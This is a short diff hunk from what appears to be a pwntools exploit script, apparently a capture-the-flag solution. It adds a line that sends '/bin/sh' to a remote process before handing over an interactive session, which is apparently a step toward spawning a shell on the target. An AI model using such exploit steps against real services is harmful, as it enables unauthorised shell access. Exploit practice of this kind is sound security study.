@@ -38,5 +38,5 @@ r.recvuntil(b"B: ")
 r.sendline(b"1")
 
 r.recvuntil(b"A: ")
-
+r.sendline(b"/bin/sh")
 r.interactive()
